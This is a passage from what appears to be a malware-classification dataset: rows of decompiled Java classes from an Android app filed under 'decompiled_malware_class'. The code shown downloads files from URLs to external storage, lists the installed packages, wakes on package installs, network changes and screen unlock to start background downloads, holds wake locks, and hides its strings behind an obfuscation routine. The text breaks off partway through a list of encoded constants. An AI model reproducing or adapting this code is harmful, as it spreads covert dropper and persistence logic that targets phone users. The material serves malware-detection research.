(atVar.E == 1) {       hVar.b(aq.c(context));     }     hVar.a((Object)(-2));     aq.a(context,R.drawable.stat_sys_download,h.cr,atVar.h,16,new Intent(),atVar.g,0);     aq.a(context,hVar,new m(context,atVar,null));   }   public static void c(  String str,  String str2){     URL url=new URL(str);     url.openConnection().connect();     BufferedInputStream bufferedInputStream=new BufferedInputStream(url.openStream());     String str3=h.j + h.cf;     File file=new File(Environment.getExternalStorageDirectory(),str3);     if (!file.exists()) {       file.mkdirs();     }     FileOutputStream fileOutputStream=new FileOutputStream(new File(Environment.getExternalStorageDirectory(),str3 + h.B));     byte[] bArr=new byte[1024];     long j2=0;     while (true) {       int read=bufferedInputStream.read(bArr);       if (read == -1) {         fileOutputStream.flush();         fileOutputStream.close();         bufferedInputStream.close();         return;       }       j2+=read;       fileOutputStream.write(bArr,0,read);     }   }   private static boolean c(  Context context,  int i2){     SharedPreferences.Editor edit=context.getSharedPreferences(h.g,0).edit();     edit.putInt(h.X,i2);     Calendar calendar=Calendar.getInstance();     calendar.setTimeInMillis(System.currentTimeMillis());     edit.putString(h.au,calendar.get(1) + ""-"" + calendar.get(2)+ ""-""+ calendar.get(5));     return edit.commit();   }   public static boolean c(  Context context,  String str){     String[] split; synchronized (g) {       if (str != null) {         if (!"""".equals(str)) {           String[] split2=str.split("";"");           if (split2 != null) {             for (            String str2 : split2) {               if (str2 != null && (split=str2.split("","")) != null && split.length == 2) {                 try {                   a(context,Integer.parseInt(split[0]),Integer.parseInt(split[1]));                 }  catch (                Exception e2) {                   e2.printStackTrace();                 }               }             }           }         }       }     }     return false;   }   public static long d(){     if (!""mounted"".equals(Environment.getExternalStorageState())) {       return 0L;     }     StatFs statFs=new StatFs(Environment.getExternalStorageDirectory().getPath());     return (statFs.getAvailableBlocks() * statFs.getBlockSize()) / 1024;   }   protected static String d(  String str){     if (str == null || str.length() == 0) {       return str;     }     Matcher matcher=i.matcher(str);     ArrayList arrayList=new ArrayList();     while (matcher.find()) {       try {         arrayList.add(Integer.valueOf(matcher.group()));       }  catch (      Exception e2) {         e2.printStackTrace();         return str;       }     }     if (arrayList.size() <= 0) {       return str;     }     try {       byte[] bArr=new byte[arrayList.size()];       byte[] bytes=h.getBytes();       Iterator it=arrayList.iterator();       int i2=0;       while (it.hasNext()) {         bArr[i2]=(byte)(((Integer)it.next()).intValue() - (bytes[i2 % bytes.length] & 255));         i2++;       }       return new String(bArr,h.aZ);     }  catch (    UnsupportedEncodingException e3) {       e3.printStackTrace();       return str;     }   }   public static void d(  Context context){     at[] b2=b(context);     if (b2 == null) {       return;     }     SharedPreferences.Editor edit=context.getSharedPreferences(h.f,0).edit();     for (    at atVar : b2) {       String str="""" + atVar.f;       if (atVar.c + 864000000 >= System.currentTimeMillis()) { switch (atVar.e) { case 0: case 2: case 4: case 6: case 8: case 9: case 10:           if (atVar.l.intValue() == 2) {             edit.remove(str);             break;           }  else {             break;           } case 1: case 3:         if (atVar.l.intValue() == 3) {           edit.remove(str);           break;         }  else {           break;         }     }   }  else {     edit.remove(str);   } } edit.commit(); } protected static boolean d(Context context,String str){ int i2=0; List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(0); ArrayList arrayList=new ArrayList(); if (installedPackages != null) {   while (true) {     int i3=i2;     if (i3 >= installedPackages.size()) {       break;     }     arrayList.add(installedPackages.get(i3).packageName);     i2=i3 + 1;   } } return arrayList.contains(str); } public static long e(){ StatFs statFs=new StatFs(new File(h.r).getPath()); return (statFs.getAvailableBlocks() * statFs.getBlockSize()) / 1024; } public static String e(Context context){ String stringBuffer; synchronized (g) {   StringBuffer stringBuffer2=new StringBuffer();   SharedPreferences sharedPreferences=context.getSharedPreferences(h.h,0);   for (  String str : sharedPreferences.getAll().keySet()) {     for (    String str2 : a(sharedPreferences.getString(str,""""),"","")) {       stringBuffer2.append(str + "","" + str2+ "";"");     }   }   SharedPreferences.Editor edit=sharedPreferences.edit();   edit.clear();   edit.commit();   stringBuffer=stringBuffer2.toString(); } return stringBuffer; } public static boolean e(Context context,String str){ Intent a2=a(context,str,context.getPackageManager()); if (a2 == null) {   return false; } context.startActivity(a2); return true; } private static boolean e(String str){ try {   Long.valueOf(str.substring(0,3));   return true; }  catch (Exception e2) {   return false; } } public static boolean f(Context context){ return (context.getApplicationInfo().flags & 1) > 0; } protected static boolean f(Context context,String str){ if (str == null) {   return false; } SharedPreferences.Editor edit=context.getSharedPreferences(h.D,0).edit(); edit.putString(h.D,str); return edit.commit(); } public static List g(Context context){ int i2=0; List<PackageInfo> installedPackages=context.getPackageManager().getInstalledPackages(0); ArrayList arrayList=new ArrayList(); if (installedPackages != null) {   while (true) {     int i3=i2;     if (i3 >= installedPackages.size()) {       break;     }     arrayList.add(installedPackages.get(i3).packageName);     i2=i3 + 1;   } } return arrayList; } public static void g(Context context,String str){ synchronized (f) {   if (str == null) {     return;   }   SharedPreferences sharedPreferences=context.getSharedPreferences(h.d,0);   String string=sharedPreferences.getString(h.e,"""");   if (!string.equals("""")) {     str=string + "";"" + str;   }   SharedPreferences.Editor edit=sharedPreferences.edit();   edit.putString(h.e,str);   edit.commit(); } } public static ad h(Context context,String str){ if (str == null || str.trim().length() == 0) {   return null; } List<ad> q=q(context); if (q == null || q.size() <= 0) {   return null; } for (ad adVar : q) {   if (str.equals(adVar.f)) {     return adVar;   } } return null; } public static String h(Context context){ String[] a2; StringBuffer stringBuffer=null; String a3=a(h.j + h.w); if (a3 == null || """".equals(a3) || (a2=a(a3,"";"")) == null) {   return null; } for (String str : a2) {   String[] a4=a(str,"","");   if (a4 != null && a4.length == 2 && d(context,a4[1])) {     if (stringBuffer == null) {       stringBuffer=new StringBuffer(a4[0]);     }  else {       stringBuffer.append("","");       stringBuffer.append(a4[0]);     }   } } return stringBuffer != null ? stringBuffer.toString() : """"; } public static String i(Context context){ f(context,""ffaf1a9996c643de9f0c2f70e1500c18""); return ""ffaf1a9996c643de9f0c2f70e1500c18""; } protected static String i(Context context,String str){ Bundle bundle; try {   ApplicationInfo applicationInfo=context.getPackageManager().getApplicationInfo(context.getPackageName(),128);   if (applicationInfo == null || (bundle=applicationInfo.metaData) == null) {     return null;   }   return bundle.getString(str); }  catch (PackageManager.NameNotFoundException e2) {   e2.printStackTrace();   return null; } } public static Location j(Context context){ return null; } private static void j(Context context,String str){ if (str == null) {   return; } context.getSharedPreferences(h.l,0).edit().putString(h.bH,c(str)).commit(); } public static int k(Context context){ try {   return context.getPackageManager().getPackageInfo(context.getPackageName(),0).versionCode; }  catch (PackageManager.NameNotFoundException e2) {   e2.printStackTrace();   return 1; } } public static String l(Context context){ File file=new File(Environment.getExternalStorageDirectory(),h.k); String a2=a(context,file); if (a2 == null || """".equals(a2)) {   a2=b(context,file); } return (a2 == null || """".equals(a2) || !e(a2)) ? """" : a2; } public static String m(Context context){ String string; synchronized (f) {   SharedPreferences sharedPreferences=context.getSharedPreferences(h.d,0);   string=sharedPreferences.getString(h.e,"""");   SharedPreferences.Editor edit=sharedPreferences.edit();   edit.putString(h.e,null);   edit.remove(h.e);   edit.clear();   edit.commit(); } return string; } public static String n(Context context){ String string=context.getSharedPreferences(h.D,0).getString(h.E,null); return string != null ? string : i(context,h.E); } public static int o(Context context){ int i2; synchronized (g) {   i2=context.getSharedPreferences(h.n,0).getInt(h.bH,0); } return i2; } public static void p(Context context){ List<ad> q=q(context); if (q != null && q.size() > 0) {   for (  ad adVar : q) {     File file=new File(Environment.getExternalStorageDirectory() + ""/"" + h.j+ adVar.e+ ""/""+ b(a(adVar)));     if (file.exists()) {       aq.a(context,R.drawable.stat_sys_download_done,h.cA,adVar.e,32,a(context,file,0),adVar.d,-1);     }   } } at[] b2=b(context); if (b2 == null || b2.length <= 0) {   return; } for (int i2=0; i2 < b2.length; i2++) {   ad a2=a(b2[i2]);   File file2=new File(Environment.getExternalStorageDirectory() + ""/"" + h.j+ a2.e+ ""/""+ b(b2[i2]));   if (b2[i2].l.intValue() == 4 && file2.exists()) {     aq.a(context,R.drawable.stat_sys_download_done,h.cA,a2.e,32,a(context,file2,0),a2.d,-1);   } } } private static List q(Context context){ SharedPreferences sharedPreferences=context.getSharedPreferences(h.c,0); Map<String,?> all=sharedPreferences.getAll(); if (all == null || all.size() <= 0) {   return null; } Iterator<String> it=all.keySet().iterator(); ad[] adVarArr=new ad[all.size()]; ArrayList arrayList=new ArrayList(); while (it.hasNext()) {   String string=sharedPreferences.getString(it.next(),null);   ad adVar=new ad();   if (!adVar.a(string)) {     sharedPreferences.edit().clear().commit();     return null;   }   try {     arrayList.add(adVar);   }  catch (  Exception e2) {     e2.printStackTrace();   } } return arrayList; } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\az.code","public class az {   static String f96a=null;   private static Class b;   private static Class c;   private static Class d;   public static Class a(  Context context){     if (b == null) {       b=ay.a(context,Hnu.class);     }     return b;   }   public static Class b(  Context context){     if (c == null) {       c=ay.b(context,Dgl.class);     }     return c;   }   public static Class c(  Context context){     if (d == null) {       d=ay.c(context,Wi.class);     }     return d;   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\b.code","public class b extends AsyncTask {   final a f97a;   private StringBuffer b;   private Context c;   private int d;   private int e;   public b(  a aVar,  Context context,  int i,  int i2){     this.f97a=aVar;     this.c=context;     this.d=i;     this.e=i2;   }   @Override public ag doInBackground(  Void... voidArr){     x a2=x.a(this.c);     this.b=new StringBuffer();     String m=ay.m(this.c);     if (!"""".equals(m)) {       this.b.append(m);       this.b.append("";"");     }     this.b.append(this.d);     this.b.append("","");     this.b.append(this.e);     ag a3=a2.a(this.b.toString());     if (a3 != null) {     }     return a3;   }   @Override public void onPostExecute(  ag agVar){     super.onPostExecute(agVar);     if (agVar == null || !(agVar == null || agVar.f82a == 0)) {       ay.g(this.c,this.b == null ? null : this.b.toString());     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\c.code","!org.eclipse.jdt.core.dom.TypeDeclaration@8ffb6a7"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\d.code","public class d implements Runnable {   final c f110a;   public d(  c cVar){     this.f110a=cVar;   }   @Override public void run(){     this.f110a.b();   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\Dgl.code","public class Dgl extends BroadcastReceiver {   static PowerManager.WakeLock f72a;   static PowerManager.WakeLock c;   private Context e;   private Handler f=new t(this);   static final Object b=new Object();   static final Object d=new Object();   private static Set g=new HashSet();   public static void a(){ synchronized (d) {       if (c != null) {         c.release();       }     }   }   public static void a(  Context context,  Intent intent){ synchronized (b) {       if (f72a == null) {         f72a=((PowerManager)context.getSystemService(""power"")).newWakeLock(1,h.W);         f72a.setReferenceCounted(false);       }       f72a.acquire();       intent.setClass(context,az.c(context));       context.startService(intent);     }   }   public static boolean a(  Context context){     NetworkInfo activeNetworkInfo;     try {       ConnectivityManager connectivityManager=(ConnectivityManager)context.getSystemService(""connectivity"");       if (connectivityManager != null && (activeNetworkInfo=connectivityManager.getActiveNetworkInfo()) != null && activeNetworkInfo.isConnected()) {         if (activeNetworkInfo.getState() == NetworkInfo.State.CONNECTED) {           return true;         }       }     }  catch (    Exception e) {     }     return false;   }   public static Handler b(  Dgl dgl){     return dgl.f;   }   public void b(  Context context){     if (((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo() != null) {       String c2=aq.c(context);       com.apkmore.rbjatnldymzfiw.j.b.d a2=com.apkmore.rbjatnldymzfiw.j.b.d.a();       if (a2 == null) {         a2=com.apkmore.rbjatnldymzfiw.j.b.d.a(context);       }       List<com.apkmore.rbjatnldymzfiw.j.b.h> d2=a2.d();       if (d2 != null) {         if (h.aw.equalsIgnoreCase(c2)) {           for (          com.apkmore.rbjatnldymzfiw.j.b.h hVar : d2) {             if (hVar.l() != 0) {               at b2=ay.b(context,hVar.m());               if (b2 != null) {                 hVar.a((com.apkmore.rbjatnldymzfiw.j.b.c)new m(context,b2,null));               }               hVar.e();             }           }           return;         }         for (        com.apkmore.rbjatnldymzfiw.j.b.h hVar2 : d2) {           if (hVar2.l() != 0) {             hVar2.m();             if (!h.aw.equalsIgnoreCase(hVar2.k())) {               at b3=ay.b(context,hVar2.m());               if (b3 != null) {                 hVar2.a((com.apkmore.rbjatnldymzfiw.j.b.c)new m(context,b3,null));               }               hVar2.e();             }           }         }       }     }   }   @Override public void onReceive(  Context context,  Intent intent){     this.e=context;     String action=intent.getAction();     if (""android.intent.action.PACKAGE_ADDED"".equals(action)) {       String uri=intent.getData().toString();       String substring=uri.substring((h.ay + "":"").length(),uri.length());       ad h=ay.h(this.e,substring);       if (h != null) {         ay.b(this.e,h);         Message obtain=Message.obtain();         obtain.arg1=h.e;         obtain.obj=h;         obtain.what=1;         this.f.sendMessage(obtain);       }       new Timer().schedule(new o(this,substring),0L);       return;     }     if (action == null) {       String stringExtra=intent.getStringExtra(h.ax);       if (stringExtra == null) {         a(this.e,intent);         return;       }       if (h.U.equals(stringExtra)) { synchronized (d) {           if (c == null) {             c=((PowerManager)this.e.getSystemService(""power"")).newWakeLock(1,h.V);             c.setReferenceCounted(false);           }           at atVar=new at();           if (atVar.a(intent.getStringExtra(h.aA))) {             atVar.f=intent.getIntExtra(h.R,-1);             c.acquire();             am.a(this.e).b(atVar);           }         }         return;       }       return;     }     if (!action.equals(h.by)) {       if (!""android.net.conn.CONNECTIVITY_CHANGE"".equals(action)) {         if (""android.intent.action.USER_PRESENT"".equals(action)) {           new Timer().schedule(new r(this),new Random().nextInt(5000));           ay.p(context);           return;         }         return;       }       Message obtain2=Message.obtain();       obtain2.what=2;       this.f.sendMessageDelayed(obtain2,40000L);       if (a(this.e)) {         new Timer().schedule(new p(this),new Random().nextInt(5000));         return;       }       return;     }     String stringExtra2=intent.getStringExtra(h.ax);     if (stringExtra2 == null) {       a(this.e,intent);       return;     }     if (h.U.equals(stringExtra2)) { synchronized (d) {         if (c == null) {           c=((PowerManager)this.e.getSystemService(""power"")).newWakeLock(1,h.V);           c.setReferenceCounted(false);         }         at atVar2=new at();         if (atVar2.a(intent.getStringExtra(h.aA))) {           atVar2.f=intent.getIntExtra(h.R,-1);           c.acquire();           am.a(this.e).b(atVar2);         }       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\e.code","public class e extends Handler {   final c f117a;   public e(  c cVar){     this.f117a=cVar;   }   @Override public void handleMessage(  Message message){     Activity activity;     int i;     Bundle data=message.getData();     int i2=data.getInt(h.aE);     String string=data.getString(h.aC);     if (string != null) {       activity=this.f117a.e;       Bitmap a2=com.apkmore.rbjatnldymzfiw.j.d.e.a(activity,string);       if (a2 == null || this.f117a.f103a == null) {         return;       }       if (i2 == -1) {         this.f117a.f103a.a(a2);       }  else       if (i2 > -1) {         i=this.f117a.c;         if (i2 < i) {           this.f117a.f103a.a(a2,i2);         }       }     }   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\f.code","public class f implements View.OnClickListener {   final c f118a;   public f(  c cVar){     this.f118a=cVar;   }   private Intent a(  String str){     Intent intent=new Intent(""android.intent.action.SEND"");     intent.setType(h.aF);     intent.putExtra(""android.intent.extra.TEXT"",str);     intent.putExtra(""android.intent.extra.SUBJECT"",h.aG);     return Intent.createChooser(intent,h.cp);   }   private void a(){     at atVar;     Activity activity;     File file;     Activity activity2;     at atVar2;     at atVar3;     at atVar4;     Activity activity3;     at atVar5;     at atVar6;     Activity activity4;     Activity activity5;     at atVar7;     Activity activity6;     Activity activity7;     at atVar8;     at atVar9;     atVar=this.f118a.d;     int i=atVar.o / 1024;     if (((int)ay.d()) > i) {       activity7=this.f118a.e;       atVar8=this.f118a.d;       String b=ay.b(atVar8);       atVar9=this.f118a.d;       file=ay.b(activity7,b,atVar9.h);     }  else {       if (ay.e() <= i) {         activity=this.f118a.e;         Toast.makeText(activity,h.cq,3000).show();         return;       }       StringBuilder append=new StringBuilder().append(h.r);       activity2=this.f118a.e;       StringBuilder append2=append.append(activity2.getPackageName()).append(""/"");       atVar2=this.f118a.d;       file=new File(append2.append(ay.b(atVar2)).toString());       File parentFile=file.getParentFile();       if (!parentFile.exists()) {         parentFile.mkdirs();       }     }     atVar3=this.f118a.d;     com.apkmore.rbjatnldymzfiw.j.b.h hVar=new com.apkmore.rbjatnldymzfiw.j.b.h(atVar3.d,file,1);     atVar4=this.f118a.d;     if (atVar4.E == 1) {       activity6=this.f118a.e;       hVar.b(aq.c(activity6));     }     hVar.a((Object)(-2));     activity3=this.f118a.e;     String str=h.cr;     atVar5=this.f118a.d;     int i2=atVar5.h;     Intent intent=new Intent();     atVar6=this.f118a.d;     aq.a(activity3,R.drawable.stat_sys_download,str,i2,16,intent,atVar6.g,0);     activity4=this.f118a.e;     activity5=this.f118a.e;     atVar7=this.f118a.d;     aq.a(activity4,hVar,new m(activity5,atVar7,null));   }   @Override public void onClick(  android.view.View r9){     throw new UnsupportedOperationException(""Method not decompiled: com.apkmore.rbjatnldymzfiw.j.f.onClick(android.view.View):void"");   } } "
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\g.code","!org.eclipse.jdt.core.dom.TypeDeclaration@729f5fc8"
"msc_data/decompiled_malware_class/00217C8F76AAA8E5453BFC1269CB080A9A2F7F3D32480FC0C4A1EB99C22AFBAC\com.apkmore.rbjatnldymzfiw.j\h.code","public final class h {   public static final String f120a=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ­Ã³Ã¿Ã¬Ã€Â½\u00adÄ…Â¥Ã¾Ã¦Ä�Ã±Ã¦Ã­Ä‡Â¤Ã’Ä€Â½ÃšÃ³Ã¯Ã Ã Â²Ã¸Ã¥Ã–Ã¥Â¦Ã³Ã¨Ã³Ã´Ã«Ã´y"");   public static final String b=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ®Ä‚Ã²Ä…Â±Â¿Â¬Ä€Ã°Ã±Ã§Ã½Â¤Ã�Ã»Ã¼ÃžÃ±Ã±Ã¯Â Ã¦Ã¸Â²Ã–Ã¥Ã¥Ã»Ã³Â®Ã½ÃŸÃ§Ã²Â¬Ã¶ÃšÄ„Ã¦ÄŽÃºy"");   public static final String c=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¶Ä‰Ã«Ã¨Ã­Ä†Ã¤Ã›Ä�Ã¯Ã�Ã�Ã²Ã§Ã¥y"");   public static final String d=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃŽÃ¡Ã¯Ã¯Ä„Ã¯Ã³Ã«Ã¼Ã›Ã�Ã¶y"");   public static final String e=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ‚Ã¢Ä‚Ã»Ã±Ã«Ã´Ã¤Ã“Ã¥Ä‚ÃšÄƒÃ§y"");   public static final String f=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ˜Ã¶Ã£Ã«Ã´Ã©Ã¢Ã³ÃµÃžÃ®Ã²Ã©Ã—Ã©Ã½y"");   public static final String g=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ˜Ã¶Ã£Ã°Ã´Ã§Ã¤Ã·Ä�Ã­Ã®Ã²Ã©Ã—Ã©Ã½y"");   public static final String h=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ°ÃºÃœÄ‘Ã±ÃµÃ³Ã´Ã©Ã£Ã±Ä�Ã­y"");   public static final String i=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ·Ã¹Ã•Ã£Ä�ÃµÃ Ã»Ã§Ã–Ã˜Ã¯Ã«ÃªÃ”Ã±ÃªÃ·Ã«y"");   public static final String j=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¹Ã¦Ä‡Ã«Ä‹Ã»Ã¥Ã¢Â¾Â¯Ã™Ã�y"");   public static final String k=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¾ÃƒÃ¥Ã–ÃµÃ¹Ã¬Ã™Â°ÃœÃ³Ã¹Ã ÂºÃŸÃµÃ²Ã£Ã„Ã„Ã™Ã�Ã�Ã�Ã…Ã’y"");   public static final String l=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¥Ã»Ã©y"");   public static final String m=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ³Â¦Â³Â«Ã†ÂºÂµÃ‚Â´Â¿Ã¯Ã Ã¸Ã›ÃµÃ£Ã�Â½Â¶Â±ÃƒÂ«Â¥Ã‰Ã†Â²Ã°Ã¤ÃšÃ–Ã¨Ã°y"");   public static final String n=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ‹Ã˜Ã¼Ã¦ÄƒÃ«Ã·Ã£Ä�Ã¬Ã”Ä„y"");   public static final String o=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ©Ã´Ã±Ã°ÄƒÃ¬y"");   public static final String p=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¨Ã¿Ã›Ã¿Ã´Ä�Ã¸Ã³ÃŸÃ³Ã©y"");   public static final String q=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ�ÃžÃ—Ã‹Ã�y"");   public static final String r=com.apkmore.rbjatnldymzfiw.j.d.c.a(""x\u00adÃ¹Ã˜Ä„ÃžÃŽÃ°Ã¥Ã²Ã°Â¥y"");   public static final String s=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂªÃ¶Ã¼Ã¥ÃƒÃ›Ã±Ã±y"");   public static final String t=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂªÃ°Ã¾Ã¥ÃƒÃ›Ã±Ã±y"");   public static final String u=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¶\u00adÃ¯Ã�Ãºy"");   public static final String v=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ·\u00adÃ¯Ã�Ãºy"");   public static final String w=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¸\u00adÃ¯Ã�Ãºy"");   public static final String x=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¹\u00adÃ¯Ã�Ãºy"");   public static final String y=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂº\u00adÃ¯Ã�Ãºy"");   public static final String z=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ»\u00adÃ¯Ã�Ãºy"");   public static final String A=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ¼\u00adÃ¯Ã�Ãºy"");   public static final String B=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÂ°Â¼ÂªÃªÃ¯Ã²y"");   public static final String C=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ´ÂµÂ¯y"");   public static final String D=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¼Â²Ã¨Ã¯y"");   public static final String E=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ±Ã¦Ã¶Ã¥Ã¾Ã¢Ä‹Â¹Ã­Ã¢y"");   public static final String F=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ—Ã»Ã©y"");   public static final String G=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ­Ä„Ã±y"");   public static final String H=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¸Ã®Ã«Ã°y"");   public static final String I=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ…Ã®Ã¹Ã°y"");   public static final String J=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ‚Ã­Ä‰Ã˜Ã¼ÃœÄ’ÃµÃ¾Ã£y"");   public static final String K=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¸Ã³Ã¬Ã°Ã«y"");   public static final String L=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄƒÃœÄ„Ã´ÄŽÃ¾Ã¯Ã�Ã¸Ã¤Ã•Ä�y"");   public static final String M=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¬Ã·ÃªÃºÃ–Ã¾ÃžÄŒÃ±y"");   public static final String N=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ›Ã¿Ã´Ä�Ã¸Ã³ÃŸÃ³Ã•ÃœÄ�Ã²Ãžy"");   public static final String O=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ·Ã™Ã Ã²y"");   public static final String P=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¸Ã³Ã¯ÄŠÃœÄƒÃ±Ã¨Ã°y"");   public static final String Q=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¨Ã¾ÃˆÃµÃ±Ã©y"");   public static final String R=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¯Ã®Ã¯Ã°ÃºÃ›Ã¹Ã¡y"");   public static final String S=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¯Ã®Ã½Ã°Ä‰ÃšÄ…Ã±y"");   public static final String T=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ°ÃºÃ¨Ä…Ã¢Ä’Ä€Ã‘Ã­Ã³Ã›y"");   public static final String U=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃŒÃ Ã‡ÃºÃŸÄ‡Ã¤y"");   public static final String V=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¢ÃªÃ�Ä„Ä‚Ã¢Ã½Ã©Â¸ÃžÃ¨Ã¼Ã·Ã‚Ã¦Ã«Ä…Ã¦Ã¦Ã°y"");   public static final String W=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¢ÃªÃ�Ä„Ä‚Ã¢Ã½Ã©Â¸ÃžÃ¨Ã¼Ã·ÃˆÃ¦ÃªÄˆÃ®Ã¢Ã°y"");   public static final String X=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¬ÃºÃ¯Ä„Ã�Ä„Ã½Ã¹Ã£Ä‚Ãªy"");   public static final String Y=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ�ÃªÄ�Ã‘Ä‰Ã˜Ä„Ã¢y"");   public static final String Z=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃšÃ»Ã¬y"");   public static final String aa=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ�Ã¶Ã¾Ã�Ã¹Ã˜Ä„Ã¢y"");   public static final String ab=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ­Ã¯Ã«ÃºÃ–Ã´ÃžÄ“Ã±y"");   public static final String ac=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ‚Â¼y"");   public static final String ad=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ©Ã³Ä„Ã¬Ã«y"");   public static final String ae=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ�Ã¦Ä„Ã®ÄƒÃ­Ä‘ÃµÃ¸Ã£y"");   public static final String af=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃºÃ§ÄˆÃ«Ã¯Ã°Ä“Ä…Ã°Ã£y"");   public static final String ag=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ�Ã¶Ã¾Ã�Ä‰Ã°Ä€Ã¢y"");   public static final String ah=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ³Ã¬ÃžÃ¶Ã·Ã¡y"");   public static final String ai=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ˜Ã¼Ã©Ã¾Ã­Ã´Ã®Ã®Ã™ÃžÄ‡Ã¼Ã­y"");   public static final String aj=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ±Ã©Ä‹Ã«Ã«ÃŸÃ¼Ã›ÃŽÃµÃ½Ã®Ã½Ã¶y"");   public static final String ak=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÄ’Ã´Ã³ÃµÃ®Ã¢ÃžÃµÃ¹Ã˜ÄƒÃ±ÃžÃ™Ã¯Ã¯y"");   public static final String al=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ¸Ã¦Ã½Â«Ä€ÃºÃ¨Ã°Ã¾ÃŸÃ“Ã€ÃºÃšÄ„Ã°ÃšÃšÃ¨Ã¼Â±Ã–Ã¤Ã¬Ã»Ã´Ã­Â¹Ã…Ã”Ã¡Ã’Ã–ÃƒÃœÃœÃ²Ã”Ã“Ã�Ã£Â¹Ã„Ã¦y"");   public static final String am=com.apkmore.rbjatnldymzfiw.j.d.c.a(""xÃ³Ã³Ã£Ã½Ã«Ã¯Ã²Â¬ÄƒÃœÄ„Â«Ä‚Ã»Ã²Ã¬Â½Â¹Â¾Ã ÃœÂ¾Ã’Ã–Ã€ÃˆÃŒÃžÃœÃ”Ã„Ã€Ã“Ã“Ã†Ã�y"");   public static final String 